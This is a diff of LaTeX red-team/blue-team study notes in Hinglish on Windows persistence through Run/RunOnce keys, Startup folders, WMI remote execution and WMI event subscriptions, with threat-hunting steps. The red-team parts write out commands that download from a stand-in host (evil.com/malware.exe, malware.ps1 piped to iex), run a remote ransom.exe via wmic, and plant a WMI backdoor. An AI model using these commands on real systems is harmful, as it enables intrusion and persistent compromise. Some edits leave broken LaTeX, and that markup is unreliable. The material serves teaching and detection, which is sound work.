   \definecolor{codebg}{RGB}{245,245,245}
   \definecolor{titleblue}{RGB}{0,51,102}
   \definecolor{notered}{RGB}{200,0,0}
@@ -1905,16 +1918,28 @@ virustotal.com
         \item Initial Access: Meterpreter shell se registry modify karo using command: \texttt{reg add HKU\textbackslash SOFTWARE\textbackslash Microsoft\textbackslash Windows\textbackslash CurrentVersion\textbackslash Run /v NotepadTest /t REG\_SZ /d "C:\textbackslash Windows\textbackslash System32\textbackslash notepad.exe"}.
         \item What Happens: System reboot karo -- login par Notepad auto-open ho jaayega. Real mein, yahan malware path daalo jaise "C:\textbackslash hidden\textbackslash backdoor.exe".
         \item Blue Team Detection (Threat Hunting): Blue teamer Sysmon ya EDR use karega. Step: Event Viewer check karo for registry changes (Event ID 4657). Tool jaise Autoruns (from Sysinternals) run karo -- yeh list karega all run keys. Agar suspicious entry mile (jaise unknown .exe), investigate karo file hash via VirusTotal, then remove via \texttt{reg delete}.
-        \item Advanced Hunt: Sigma rules se hunt karo for registry persistence, ya PowerShell se query: \texttt{Get-ItemProperty -Path "HKU:\textbackslash*\textbackslash Software\textbackslash Microsoft\textbackslash Windows\textbackslash CurrentVersion\textbackslash Run"}.
-      \end{enumerate}
+       \item Advanced Hunt: Sigma rules se hunt karo for registry persistence, ya PowerShell se query:\\
+\texttt{Get-ItemProperty -Path "HKU:\textbackslash{}*\textbackslash{}Software\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}CurrentVersion\textbackslash{}Run"}
       \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
-\begin{verbatim}
-reg add HKU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v NotepadTest /t REG_SZ /d "C:\Windows\System32\notepad.exe"
-reg delete
-Get-ItemProperty -Path "HKU:\*\Software\Microsoft\Windows\CurrentVersion\Run"
-\end{verbatim}
+\begin{itemize}
+  \item Registry persistence ke examples:
+
+  \texttt{reg add HKU\textbackslash{}SOFTWARE\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}CurrentVersion\textbackslash{}Run}\\
+  \texttt{/v NotepadTest /t REG\_SZ /d "C:\textbackslash{}Windows\textbackslash{}System32\textbackslash{}notepad.exe"}\\
+  \texttt{reg delete}\\
+  \begin{itemize}
+  \item Advanced Hunt: Sigma rules se hunt karo for registry persistence, ya PowerShell se query:
+
+  \texttt{Get-ItemProperty -Path} \\
+  \texttt{"HKU:\textbackslash{}*\textbackslash{}Software\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}CurrentVersion\textbackslash{}Run"}
+\end{itemize}
+\end{itemize}
       \end{tcolorbox}
-    \item \textbf{Note:}\color{notered} Note: \color{black} HKEY\_USERS\textbackslash Software\textbackslash Microsoft\textbackslash Windows\textbackslash CurrentVersion\textbackslash RunOnce (and similar like RunServices, etc.) (Corrected) Tune "HKEY\_users/software/microsoft/windows/x---x=run once, runservice..etc" likha -- yeh correct hai, x jaise RunOnce, RunServicesOnce, etc. Yeh HKEY\_USERS ke under hain, similar to above but with twists.
+   \item \textbf{Note:} \textcolor{red}{Note:} \textcolor{black}{
+HKEY\_USERS\textbackslash{}Software\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}CurrentVersion\textbackslash{}RunOnce (and similar like RunServices, etc.)\\
+(Corrected) Tune "HKEY\_users/software/microsoft/windows/x---x=run once, runservice..etc" likha -- yeh correct hai, x jaise RunOnce, RunServicesOnce, etc.\\
+Yeh HKEY\_USERS ke under hain, similar to above but with twists.
+}
       \begin{itemize}
         \item What it is: RunOnce programs ko \textbf{sirf ek baar} run karta hai boot/login par, phir delete ho jaata hai. RunServices services ke liye hai (background processes). RunServicesOnce ek baar ke liye.
         \item What is stored: Same, executable paths, but temporary.
@@ -1923,14 +1948,30 @@ Get-ItemProperty -Path "HKU:\*\Software\Microsoft\Windows\CurrentVersion\Run"
         \item When \& Why: Use jab tu avoid karna chahe long-term traces. Why? Kyunki yeh self-cleaning hai, blue team ko hunt karna hard hota hai post-execution.
         \item Advanced: RunOnceEx variant bhi hai jo multiple commands support karta hai.
       \end{itemize}
-    \item \textbf{Note:}\color{notered} Note: \color{black} Real Example with Notepad: Command: \texttt{reg add HKU\textbackslash SOFTWARE\textbackslash Microsoft\textbackslash Windows\textbackslash CurrentVersion\textbackslash RunOnce /v Test /d "notepad.exe"}. Reboot -- Notepad open hoga once, entry delete. Real threat: Yeh ransomware deploy karne ke liye use hota hai.
+    \item \textbf{Note:}\color{notered} Note: \item \textbf{Note:} \textcolor{red}{Note:} \textcolor{black}{
+Real Example with Notepad:\\
+Command: \texttt{reg add HKU\textbackslash{}SOFTWARE\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}CurrentVersion\textbackslash{}RunOnce}\\
+\texttt{/v Test /d "notepad.exe"}\\
+Reboot -- Notepad open hoga once, entry delete.\\
+Real threat: Yeh ransomware deploy karne ke liye use hota hai.
+}
       \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
-\begin{verbatim}
-reg add HKU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v Test /d "notepad.exe"
-\end{verbatim}
+\begin{itemize}
+  \item Registry Persistence Example:
+
+  \texttt{reg add HKU\textbackslash{}SOFTWARE\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}CurrentVersion\textbackslash{}RunOnce} \\
+  \texttt{/v Test /d "notepad.exe"}
+\end{itemize}
       \end{tcolorbox}
     \item \textbf{Note:}\color{notered} Note: \color{black} Threat Hunting Steps: Blue teamer Autoruns tool se check kare, ya registry snapshots compare karo pre/post boot. Advanced: Use ProcMon to capture registry writes.
-    \item \textbf{Note:}\color{notered} Note: \color{black} HKEY\_CURRENT\_USER\textbackslash Software\textbackslash Microsoft\textbackslash Windows\textbackslash CurrentVersion\textbackslash Explorer\textbackslash User Shell Folders (Corrected Path) Tune "HKEY\_current\_users/software/microsoft/windows/currentverion/Explorer/user\_shell\_folder" likha -- yeh sahi hai, but "currentverion" is "CurrentVersion", aur yeh per-current-user hai. Yeh startup folder ko control karta hai indirectly.
+\item \textbf{Note:} \textcolor{red}{Note:} \textcolor{black}{
+\texttt{HKEY\_CURRENT\_USER\textbackslash{}Software\textbackslash{}Microsoft\textbackslash{}Windows}\\
+\texttt{\textbackslash{}CurrentVersion\textbackslash{}Explorer\textbackslash{}User Shell Folders} (Corrected Path)\\
+Tune \texttt{"HKEY\_current\_users/software/microsoft/windows/}\\
+\texttt{currentverion/Explorer/user\_shell\_folder"}likha -- yeh mostly sahi hai,\\
+lekin \textbf{CurrentVersion} spelling correct hai, aur yeh per-current-user hota hai.\\
+Yeh startup folder ko indirectly control karta hai.
+}
       \begin{itemize}
         \item What it is: Yeh key defines user-specific folders jaise Startup, Desktop. Startup subkey programs ko auto-run karti hai boot par (similar to placing shortcuts in \%APPDATA\%\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup).
         \item What is stored: Paths to folders, jaise "Startup" value = "\%USERPROFILE\%\textbackslash AppData\textbackslash Roaming\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup".
@@ -1943,16 +1984,23 @@ reg add HKU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v Test /d "notepa
     \item \textbf{Note:}\color{notered} Note: \color{black} Threat Hunting Steps (Step-by-Step as Blue Teamer):
       \begin{enumerate}
         \item Basic Check: Regedit open karo, navigate to key, compare with default values.
-        \item Detection: Use PowerShell: \texttt{Get-ItemProperty -Path "HKCU:\textbackslash Software\textbackslash Microsoft\textbackslash Windows\textbackslash CurrentVersion\textbackslash Explorer\textbackslash User Shell Folders" | Select-Object Startup}. Agar changed mile, alert.
+      \item Detection: Use PowerShell:\\
+\texttt{Get-ItemProperty -Path "HKCU:\textbackslash{}Software\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}CurrentVersion}\\
+\texttt{\textbackslash{}Explorer\textbackslash{}User Shell Folders" | Select-Object Startup}.\\
+Agar changed mile, alert.
         \item Hunt: Timeline analysis karo with tools jaise Volatility (for memory forensics) ya EDR for registry mods.
         \item Mitigation: Restore default via regedit, aur group policy se lock karo registry changes.
         \item Advanced: Hunt for anomalies in startup items using WMIC: \texttt{wmic startup list full}.
       \end{enumerate}
       \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
-\begin{verbatim}
-Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" | Select-Object Startup
-wmic startup list full
-\end{verbatim}
+\begin{itemize}
+  \item Detection Commands:
+
+  \texttt{Get-ItemProperty -Path "HKCU:\textbackslash{}Software\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}}\\
+  \texttt{CurrentVersion\textbackslash{}Explorer\textbackslash{}User Shell Folders" | Select-Object Startup}
+
+  \texttt{wmic startup list full}
+\end{itemize}
       \end{tcolorbox}
     \item \textbf{Note:}\color{notered} Note: \color{black} Overall Why These for Red/Blue Teamers? Advanced Insights Red teamers inkeys ko use karte hain kyunki yeh Windows ke core part hain -- no extra install needed, high success rate. But advanced mein, obfuscate karo (jaise encoded values) to evade detection. Blue teamers (threat hunters) inko target karte hain kyunki yeh common IOCs hain -- tools jaise RegRipper ya hunting queries in Splunk/ELK.
     \item \textbf{Note:}\color{notered} Note: \color{black} Real-World Threat Example: SolarWinds attack mein attackers registry persistence use kiye for backdoors. Hunter steps: Indicators collect karo, hypothesis banao (jaise "registry changes post-compromise"), data query karo, validate, aur respond.
@@ -1962,14 +2010,16 @@ wmic startup list full
       \begin{itemize}
         \item What it is: Ek special folder jahaan tu shortcuts daal sakta hai executables ke (jaise .exe, scripts, ya apps). Jab Windows boot hota hai aur user logs in, OS is folder ko check karta hai aur sab shortcuts execute karta hai. Do main types:
           \begin{itemize}
-            \item Per-User Startup Folder: C:\textbackslash Users\textbackslash<Username>\textbackslash AppData\textbackslash Roaming\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup (hidden by default, user-specific).
+          \item Per-User Startup Folder:\\
+\texttt{C:\textbackslash{}Users\textbackslash{}<Username>\textbackslash{}AppData\textbackslash{}Roaming\textbackslash{}Microsoft}\\
+\texttt{\textbackslash{}Windows\textbackslash{}Start Menu\textbackslash{}Programs\textbackslash{}Startup} (hidden by default, user-specific).
             \item All Users Startup Folder: C:\textbackslash ProgramData\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup (system-wide, sab users ke liye).
           \end{itemize}
         \item Why it exists (Legit Reason): Microsoft ne yeh banaya taaki users easily apps auto-start kara sakein, jaise antivirus, chat apps (e.g., Slack ya Teams ka shortcut daalo, toh login par open ho jaaye). Yeh convenience ke liye hai, but attackers isko abuse karte hain.
         \item What is stored: Mostly .lnk (shortcut) files, jo point karte hain actual executable paths par (e.g., C:\textbackslash Windows\textbackslash System32\textbackslash notepad.exe). Kabhi-kabhi direct .exe ya scripts bhi, but shortcuts common hain kyunki yeh flexible hote hain (arguments add kar sakte ho, jaise silent mode mein run).
         \item Basic Example: Agar tu Microsoft Teams ka shortcut daale, toh har login par Teams launch ho jaayega without manual open.
       \end{itemize}
-    \item Ab advanced: Yeh folder registry se linked hai (jaise HKEY\_CURRENT\_USER\textbackslash Software\textbackslash Microsoft\textbackslash Windows\textbackslash CurrentVersion\textbackslash Explorer\textbackslash User Shell Folders mein defined), toh agar registry modify karo, folder path change ho sakta hai. Red teamers isko prefer karte hain kyunki yeh less noisy hai compared to services -- no admin rights always needed for per-user folder.
+    \item Ab advanced: Yeh folder registry se linked hai (jaise HKEY\_CURRENT\_USER\textbackslash \\ Software\textbackslash Microsoft\textbackslash Windows\textbackslash CurrentVersion\textbackslash Explorer\textbackslash User Shell Folders mein defined), toh agar registry modify karo, folder path change ho sakta hai. Red teamers isko prefer karte hain kyunki yeh less noisy hai compared to services -- no admin rights always needed for per-user folder.
     \item \textbf{Note:}\color{notered} Note: \color{black} How is it Useful for Red Teamers? (When, Why, and How) Red teamers (jaise main) startup folder ko persistence ke liye use karte hain kyunki yeh easy, effective, aur blends with legit programs. Yeh post-exploitation mein aata hai, jab initial access mil gaya ho.
       \begin{itemize}
         \item When to use it: Jab tu long-term access chahiye without high detection risk. Example: Corporate espionage mein, jahaan tu backdoor maintain karna chahe weeks/months ke liye. Use mat karo agar target EDR (Endpoint Detection and Response) tools use karta ho, kyunki yeh file creations ko flag kar sakte hain.
@@ -1983,43 +2033,72 @@ wmic startup list full
         \item Create a Shortcut via CMD: Direct CMD se .lnk create karna tricky hai, but PowerShell ya mklink use kar sakte ho. Simple way: Pehle file copy karo ya create.
           \begin{itemize}
             \item Command for per-user: \texttt{copy "C:\textbackslash Windows\textbackslash System32\textbackslash notepad.exe" "C:\textbackslash Users\textbackslash\%USERNAME\%\textbackslash AppData\textbackslash Roaming\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup\textbackslash NotepadTest.lnk"} (Yeh direct copy nahi, shortcut banane ke liye better use PowerShell).
-            \item Better CMD way: Use \texttt{mklink} for symbolic link, but actual shortcut ke liye: \texttt{powershell -command "\$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\textbackslash Users\textbackslash' + \$env:USERNAME + '\textbackslash AppData\textbackslash Roaming\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup\textbackslash NotepadTest.lnk'); \$s.TargetPath='C:\textbackslash Windows\textbackslash System32\textbackslash notepad.exe'; \$s.Save()"}
+            \item Better CMD way: Use \texttt{mklink} for symbolic link, but actual shortcut ke liye: \texttt{powershell -command "\$s=(New-Object -COM WScript.Shell) \\ .CreateShortcut('C:\textbackslash Users\textbackslash' + \$env:USERNAME + '\textbackslash AppData\textbackslash Roaming \\ \textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup\textbackslash NotepadTest.lnk'); \$s.TargetPath='C:\textbackslash Windows\textbackslash System32\textbackslash notepad.exe'; \$s.Save()"}
               \begin{itemize}
                 \item Yeh PowerShell via CMD call karta hai to create .lnk file.
               \end{itemize}
           \end{itemize}
         \item What Happens: Ab reboot karo aur sign-in -- Notepad auto-open ho jaayega. Stored hai: NotepadTest.lnk file jo points to notepad.exe.
-        \item For All Users (Admin Needed): \texttt{powershell -command "\$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\textbackslash ProgramData\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup\textbackslash NotepadAll.lnk'); \$s.TargetPath='C:\textbackslash Windows\textbackslash System32\textbackslash notepad.exe'; \$s.Save()"} (Run as admin).
+        \item For All Users (Admin Needed): \texttt{powershell -command "\$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\textbackslash ProgramData\textbackslash Microsoft\textbackslash Windows \\ \textbackslash Start Menu\textbackslash Programs\textbackslash Startup\textbackslash NotepadAll.lnk'); \$s.TargetPath='C:\textbackslash Windows\ \\ textbackslash System32 \\ \textbackslash notepad.exe'; \$s.Save()"} (Run as admin).
         \item Real Red Team Twist: Malware drop karo pehle (e.g., via wget in CMD: \texttt{powershell -c "Invoke-WebRequest -Uri 'http://evil.com/malware.exe' -OutFile 'C:\textbackslash hidden\textbackslash backdoor.exe'"}), phir shortcut banao pointing to yeh.
       \end{enumerate}
       \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
 \begin{verbatim}
-copy "C:\Windows\System32\notepad.exe" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\NotepadTest.lnk"
-powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\Users\' + $env:USERNAME + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\NotepadTest.lnk'); $s.TargetPath='C:\Windows\System32\notepad.exe'; $s.Save()"
-powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\NotepadAll.lnk'); $s.TargetPath='C:\Windows\System32\notepad.exe'; $s.Save()"
-powershell -c "Invoke-WebRequest -Uri 'http://evil.com/malware.exe' -OutFile 'C:\hidden\backdoor.exe'"
+copy "C:\Windows\System32\notepad.exe" 
+     "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\ \\ 
+     Programs\Startup\NotepadTest.lnk"
+
+powershell -command "$s=(New-Object -COM WScript.Shell)
+.CreateShortcut('C:\Users\' + $env:USERNAME + 
+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ \\ 
+NotepadTest.lnk'); 
+$s.TargetPath='C:\Windows\System32\notepad.exe'; 
+$s.Save()"
+
+powershell -command "$s=(New-Object -COM WScript.Shell).
+CreateShortcut('C:\ProgramData\Microsoft\Windows\Start Menu\Programs\ \\
+Startup\NotepadAll.lnk'); 
+$s.TargetPath='C:\Windows\System32\notepad.exe'; 
+$s.Save()"
+
+powershell -c "Invoke-WebRequest -Uri 'http://evil.com/malware.exe' 
+-OutFile 'C:\hidden\backdoor.exe'"
 \end{verbatim}
       \end{tcolorbox}
     \item Ab remove karne ke liye: Just delete the .lnk file from folder.
     \item \textbf{Note:}\color{notered} Note: \color{black} Real Threat Hunter Example (Step-by-Step for Blue Teamers) Maan lo ek red team attack hua, aur persistence via startup folder. As a threat hunter (blue team side), yeh steps follow karo to detect aur mitigate. Yeh real-world jaise APT attacks mein hota hai (e.g., groups jaise Lazarus startup folders use karte hain).
       \begin{enumerate}
         \item Hypothesis Bana: Assume "Adversary ne persistence ke liye startup items modify kiye" based on initial IOCs (jaise unusual network traffic).
-        \item Basic Check: File Explorer mein jaao (show hidden files on), navigate to C:\textbackslash Users\textbackslash<User>\textbackslash AppData\textbackslash Roaming\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup. Dekho suspicious .lnk files (e.g., unknown names ya paths).
-        \item Via CMD/Tool: Command: \texttt{dir "C:\textbackslash Users\textbackslash\%USERNAME\%\textbackslash AppData\textbackslash Roaming\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup" /b} to list files. All users ke liye: \texttt{dir "C:\textbackslash ProgramData\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup" /b}.
+        \item Basic Check: File Explorer mein jaao (show hidden files on), navigate to C:\textbackslash Users\textbackslash<User>\textbackslash AppData\textbackslash Roaming\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\ \\
+        textbackslash Startup. Dekho suspicious .lnk files (e.g., unknown names ya paths).
+        \item Via CMD/Tool: Command: \texttt{dir "C:\textbackslash Users\textbackslash\%USERNAME\%\textbackslash AppData\textbackslash Roaming\textbackslash \\
+        Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup" /b} to list files. All users ke liye: \texttt{dir "C:\textbackslash \\
+        ProgramData\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup" /b}.
           \begin{itemize}
             \item Tool: Sysinternals Autoruns run karo (free from Microsoft) -- yeh tab "Logon" mein startup folder list karega. Suspicious entries highlight honge.
           \end{itemize}
-        \item Advanced Hunt: EDR tool jaise CrowdStrike ya Microsoft Defender use karo for file creation events (Event ID 11 in Sysmon). Query: Search for .lnk files created in startup paths. PowerShell se: \texttt{Get-ChildItem -Path "C:\textbackslash Users\textbackslash*\textbackslash AppData\textbackslash Roaming\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup" -Recurse -Filter *.lnk | Select FullName, Target}.
+        \item Advanced Hunt: EDR tool jaise CrowdStrike ya Microsoft Defender use karo for file creation events (Event ID 11 in Sysmon). Query: Search for .lnk files created in startup paths. PowerShell se: \texttt{Get-ChildItem -Path "C:\textbackslash Users\textbackslash*\textbackslash AppData\textbackslash Roaming\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\ \\
+        textbackslash Startup" -Recurse -Filter *.lnk | Select FullName, Target}.
         \item Validation: Agar suspicious mile (e.g., .lnk pointing to C:\textbackslash hidden\textbackslash malware.exe), file hash check karo VirusTotal par. Process tree dekho Task Manager mein post-boot.
-        \item Mitigation: Delete the file: \texttt{del "C:\textbackslash Users\textbackslash\%USERNAME\%\textbackslash AppData\textbackslash Roaming\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup\textbackslash suspicious.lnk"}. Prevent future: Group Policy se restrict folder access, ya monitor with scripts.
+        \item Mitigation: Delete the file: \texttt{del "C:\textbackslash Users\textbackslash\%USERNAME\%\textbackslash AppData\textbackslash Roaming\textbackslash \\
+        Microsoft\textbackslash 
+        Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup\textbackslash suspicious.lnk"}. Prevent future: Group Policy se restrict folder access, ya monitor with scripts.
         \item Advanced Response: Forensics: Volatility se memory dump, ya timeline analysis with Plaso tool to see when folder modified hua.
       \end{enumerate}
       \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
 \begin{verbatim}
-dir "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /b
-dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" /b
-Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Recurse -Filter *.lnk | Select FullName, Target
-del "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\suspicious.lnk"
+dir "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\
+Start Menu\Programs\Startup" /b
+
+dir "C:\ProgramData\Microsoft\Windows\
+Start Menu\Programs\Startup" /b
+
+Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Microsoft\Windows\
+Start Menu\Programs\Startup" -Recurse -Filter *.lnk | 
+Select FullName, Target
+
+del "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\
+Start Menu\Programs\Startup\suspicious.lnk"
 \end{verbatim}
       \end{tcolorbox}
     \item Yeh technique common hai kyunki simple, but advanced red teamers isko combine karte hain DLL side-loading ke saath for stealth. Blue teamers isko baseline banaate hain hunting ke liye.
@@ -2077,12 +2156,14 @@ shadowcopy delete
       \begin{itemize}
         \item What it is: WMI se remote node par credentials daalke process call karta hai, jaise executable run.
         \item How/When/Why Red Teamer Uses: Lateral movement ke liye, to spread network mein. When? Jab tu compromised machine se dusre par jump karna chahe. Why? Native tool, no extra binaries, ports 135/5985 use karta hai.
-        \item Small Example: Command: \texttt{wmic /node:192.168.18.235 /user:ajay /password:pass process call create "c:\textbackslash path\textbackslash ransom.exe"}. Yeh remote IP par ransom.exe run karega. Red teamer isse use karega payload deploy karne, jaise reverse shell for further access.
+        \item Small Example: Command: \texttt{wmic /node:192.168.18.235 /user:ajay \\
+        /password:pass process call create "c:\textbackslash path\textbackslash ransom.exe"}. Yeh remote IP par ransom.exe run karega. Red teamer isse use karega payload deploy karne, jaise reverse shell for further access.
         \item Advanced: PowerShell equivalent: \texttt{Invoke-WmiMethod} for same, jaise MSI install remotely for stealth.
       \end{itemize}
       \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
 \begin{verbatim}
-wmic /node:192.168.18.235 /user:ajay /password:pass process call create "c:\path\ransom.exe"
+wmic /node:192.168.18.235 /user:ajay /password:pass process call create \\
+"c:\path\ransom.exe"
 Invoke-WmiMethod
 \end{verbatim}
       \end{tcolorbox}
@@ -2107,18 +2188,37 @@ Get-CimInstance -Query $query
         \item How/When/Why Red Teamers Use: Persistence ke liye, jaise boot par malware run. When? Long-term access chahiye. Why? Stealthy, survives reboots, hard to detect.
         \item Explain the Code (Small Example): PowerShell se create karo (as red teamer):
           \begin{enumerate}
-            \item Filter: \texttt{\$filter = Set-WmiInstance -Class \_\_EventFilter -Arguments @{Name='MyFilter'; QueryLanguage='WQL'; Query="SELECT * FROM \_\_InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32\_Process' AND TargetInstance.Name='notepad.exe'"} } (Trigger jab Notepad start ho).
+            \item Filter: \texttt{\$filter = Set-WmiInstance -Class \_\_EventFilter -Arguments @{Name='MyFilter'; QueryLanguage='WQL'; Query="SELECT * FROM \_\_InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA \\
+            'Win32\_Process' AND TargetInstance.Name='notepad.exe'"} } (Trigger jab Notepad start ho).
             \item Consumer: \texttt{\$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{Name='MyConsumer'; CommandLineTemplate='powershell.exe -c "Invoke-WebRequest -Uri evil.com/malware.ps1 | iex"'} } (Action: Malicious script download/run).
-            \item Binding: \texttt{\$binding = Set-WmiInstance -Class \_\_FilterToConsumerBinding -Arguments @{Filter=\$filter; Consumer=\$consumer; DeliverSynchronously=\$true} } (Link karo, sync mode).
+            \item Binding: \texttt{\$binding = Set-WmiInstance -Class \_\_FilterToConsumerBinding -Arguments @{Filter=\$filter; Consumer=\$consumer;
+            \\
+            DeliverSynchronously=\$true} } (Link karo, sync mode).
           \end{enumerate}
         \item What Happens: Jab Notepad start ho, WMI automatically malicious command run karega. Real red team: Boot event trigger se backdoor persist karo.
         \item Advanced: Delete karne ke liye binding pehle remove, phir filter/consumer. Custom consumers banao for complex actions.
       \end{itemize}
       \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
 \begin{verbatim}
-$filter = Set-WmiInstance -Class __EventFilter -Arguments @{Name='MyFilter'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='notepad.exe'"}
-$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{Name='MyConsumer'; CommandLineTemplate='powershell.exe -c "Invoke-WebRequest -Uri evil.com/malware.ps1 | iex"'}
-$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer; DeliverSynchronously=$true}
+$filter = Set-WmiInstance -Class __EventFilter -Arguments @{
+  Name='MyFilter'; 
+  QueryLanguage='WQL'; 
+  Query="SELECT * FROM __InstanceCreationEvent WITHIN 60 
+         WHERE TargetInstance ISA 'Win32_Process' 
+         AND TargetInstance.Name='notepad.exe'"
+}
+
+$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{
+  Name='MyConsumer'; 
+  CommandLineTemplate='powershell.exe -c 
+  "Invoke-WebRequest -Uri evil.com/malware.ps1 | iex"'
+}
+
+$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{
+  Filter=$filter; 
+  Consumer=$consumer; 
+  DeliverSynchronously=$true
+}
 \end{verbatim}
       \end{tcolorbox}
     \item \textbf{Note:}\color{notered} Note: \color{black} Real Threat Hunter Example (Step-by-Step for Blue Teamers) Maan lo red teamer ne WMI persistence set kiya. As threat hunter, yeh steps:
@@ -2145,18 +2245,7 @@ $instance = Get-WmiObject ...; $instance.Delete()
   \noindent\rule{\textwidth}{1pt}
   \texttt{=============================================================}
 
-  \documentclass[a4paper,12pt]{article}
-  \usepackage[utf8]{inputenc}
-  \usepackage[T1]{fontenc}
-  \usepackage{geometry}
-  \geometry{a4paper, margin=1in}
-  \usepackage{xcolor}
-  \usepackage{tcolorbox}
-  \tcbuselibrary{listings}
-  \usepackage{enumitem}
-  \usepackage{longtable}
-  \usepackage{booktabs}
-  \usepackage{hyperref}
+ 
 
   \definecolor{codebg}{RGB}{245,245,245}
   \definecolor{titleblue}{RGB}{0,51,102}
@@ -2177,7 +2266,9 @@ $instance = Get-WmiObject ...; $instance.Delete()
     \item \textbf{Note:}\color{notered} Note: \color{black} Kya Hai Task Scheduler? (Basic Se Shuru) Task Scheduler Windows ka built-in service hai jo automated tasks schedule karta hai – jaise programs run karna specific time ya events par. Yeh OS ke core part hai, admins use karte hain maintenance ke liye (jaise backups, updates).
       \begin{itemize}
         \item What it is: Ek tool jo tasks create, manage, aur run karta hai based on triggers (time, logon, idle, etc.) aur actions (run exe, script, etc.). Tasks XML format mein store hote hain.
-        \item Where it resides (Kahan rahta hai): Service level par – "Task Scheduler" service (Taskschd.dll) C:\textbackslash Windows\textbackslash System32 mein, tasks store hote hain C:\textbackslash Windows\textbackslash System32\textbackslash Tasks folder mein (XML files) ya registry mein (HKEY\_LOCAL\_MACHINE\textbackslash SOFTWARE\textbackslash Microsoft\textbackslash Windows NT\textbackslash CurrentVersion\textbackslash Schedule). GUI se access karo via taskschd.msc.
+        \item Where it resides (Kahan rahta hai): Service level par – "Task Scheduler" service (Taskschd.dll) C:\textbackslash Windows\textbackslash System32 mein, tasks store hote hain C:\textbackslash Windows\textbackslash System32\textbackslash Tasks folder mein (XML files) ya registry mein \\
+        (HKEY\_LOCAL\_MACHINE\textbackslash SOFTWARE\textbackslash Microsoft\textbackslash Windows NT\textbackslash \\
+        CurrentVersion\textbackslash Schedule). GUI se access karo via taskschd.msc.
         \item What is schtasks: Yeh Command-Line Interface (CLI) tool hai Task Scheduler ke liye – full name "schtasks.exe" (C:\textbackslash Windows\textbackslash System32 mein). Yeh commands se tasks create, query, delete, etc. karta hai, without GUI. Red teamers isko prefer karte hain kyunki silent aur scriptable.
         \item Why it exists (Legit Use): Microsoft ne yeh banaya automation ke liye, jaise daily backups ya software updates. But red teamers isko hijack karte hain persistence ke liye.
